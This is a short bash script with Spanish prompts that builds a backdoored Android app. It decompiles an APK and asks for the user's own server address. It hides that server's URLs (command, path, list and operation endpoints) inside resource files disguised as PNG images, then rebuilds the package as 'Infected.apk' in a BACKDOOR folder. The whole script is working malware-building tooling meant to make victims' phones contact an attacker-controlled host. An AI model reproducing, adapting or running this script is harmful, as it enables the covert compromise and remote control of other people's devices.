mkdir $HOME/MgToLs/BACKDOOR
dpkg -i .ap/apktool_2.3.4_all.deb
apktool d --no-src base.apk
bash .banner
echo "Introduce el enlace que de tu host:"
read host

var=$(echo "$host/com.txt" |& tee base/res/drawable-xhdpi-v4/image.png)
vat=$(echo "$host/ruta.txt" |& tee base/res/drawable-xhdpi-v4/image1.png)
vay=$(echo "$host/list.php" |& tee base/res/drawable-xhdpi-v4/image2.png)
vau=$(echo "$host/op.php" |& tee base/res/drawable-xhdpi-v4/image3.png)

bar=$(echo "$host/host.php" |& tee .com)
bat=$(echo "$host/host1.php" |& tee .ruta)
bay=$(echo "$host/list.txt" |& tee .list)
bau=$(echo "$host/op.txt" |& tee .op)

xar=$(pwd)

apktool b base/ --output $HOME/MgToLs/BACKDOOR/Infected.apk
cp $HOME/MgToLs/.apked -r $HOME/MgToLs/BACKDOOR/ApkEditor.apk
rm -fr base

bash .banner
echo "Tu apk ha sido configurada correctamente!"
echo ""
echo "Ahora ve a la carpeta $HOME/MgToLs/BACKDOOR/ e instala"
echo "Apk Editor pro y siguie las instucciones del video!"
echo ""
read pause
bash Tormex.sh
